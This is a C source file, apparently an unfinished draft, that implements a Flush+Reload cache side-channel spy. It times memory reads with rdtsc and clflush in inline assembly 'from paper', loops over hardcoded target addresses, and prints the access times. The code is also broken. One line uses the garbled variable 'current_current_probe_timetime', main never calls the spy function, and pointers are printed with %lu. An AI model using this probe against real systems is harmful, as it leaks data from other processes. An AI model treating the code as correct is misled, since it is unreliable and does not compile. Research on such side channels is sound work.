#define THRESHOLD 300

// probe from paper
int probe_treshold(char *adrs)
{
    volatile unsigned long time;

    asm __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time < THRESHOLD; 
}

int probe_precise(char *adrs)
{
    volatile unsigned long time;

    asm __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time; 
}

// spy process probing certain memory addresses

/**
 * loop
 * probe addresses and safe results in lists (or define length ("buffer") at beginning and just fill array)
 * wait (how to ensure constant duration of time slots?)
 * if no cache hits for X times or array full finish and create files with timings
 */
void spy(char **target_adrs, int adrs_amount, int probes_amount)
{
    unsigned long current_probe_time, probe_time;
    unsigned long adrs_times[adrs_amount][probes_amount]; // persistence TODO later
    for(int cur_slot=0;cur_slot<probes_amount;cur_slot++)
    {
        current_probe_time = 0;
        for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
        {
            char *ptr=target_adrs[cur_adr_i];
            probe_time=probe_precise(ptr); 
            printf("measured value for adrs %lu is %lu\n", ptr, probe_time);                             // probe
            current_current_probe_timetime+=probe_time;                 // sum up probe times
                                                                        // add timing to array for persistence 
        }
                                                                        // wait 2500 cycles in ns current_probe_time asd (how?)
    }
}

// default address values (?)


int main(int argc, char *argv[])
{
    char *target_adrs[2];
    target_adrs[0]=0x00000000000967c7;
    target_adrs[1]=0x0000000000095f5d;
    int adrs_amount = 2, pr_amount = 2000;
    
}
